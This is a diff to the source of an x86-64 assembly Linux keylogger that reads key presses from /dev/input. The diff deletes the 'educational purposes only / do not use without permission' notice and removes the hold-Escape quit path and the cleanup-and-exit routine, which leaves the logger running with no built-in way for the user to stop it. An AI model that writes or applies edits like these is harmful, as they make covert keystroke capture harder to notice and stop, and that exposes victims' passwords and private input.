@@ -9,9 +9,6 @@
 ; Notes:
 ;   - Only logs key press events
 ;   - Requires permissions to open /dev/input/ directory
-;
-; THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY 
-; DO NOT USE ON SYSTEMS WITHOUT EXPLICIT PERMISSION 
 
 %include "common.inc"
 global write_thread
@@ -34,7 +31,7 @@ section .data
 ; - - - UNINITIALIZED DATA - - -
 section .bss
   dev_fd resq 1        
-  input_event resb 24                   ; 16B timeval (unused), 2B type, 2B code, 4B value
+  input_event resb 24     ; 16B timeval (unused), 2B type, 2B code, 4B value
   shift_flag resb 1
   pressed_flag resb 1
   cap_flag resb 1
@@ -89,7 +86,6 @@ write_thread:
 
   call write_init 
   call read_loop
-  call write_cleanup
 
 ; Opens files and creates directories for later use 
 write_init:
@@ -132,10 +128,8 @@ handle_event:
   ; Hold handler
   ;check_hold
     cmp eax, 2 
-    jne .check_release 
+      jne .check_release 
     mov byte [pressed_flag], 0 
-    cmp bl, KEY_ESC               ; Hold escape = quit
-      je write_cleanup
     jmp .skip_event               ; ignore all other holds
 
 
@@ -155,7 +149,7 @@ handle_event:
     cmp eax, 1                    ; Just in case theres any strange value 
       jne .skip_event 
     ; Check shift or caps toggle before commiting to log 
-    cmp bl, KEY_LEFTSHIFT         ; THIS MAY CAUSE FLAG ERRORS!!!
+    cmp bl, KEY_LEFTSHIFT
       je .shift_on 
     cmp bl, KEY_RIGHTSHIFT
       je .shift_on 
@@ -259,12 +253,6 @@ write_buffer:
   mov [write_pos], rbx 
   .skip_write:
   ret 
-
-; Closes files and gracefully exits program
-write_cleanup:
-  CLOSE_FILE dev_fd
-  mov byte [keylogger_done], 1
-  EXIT 0
 
 runtime_error:
   EXIT rax
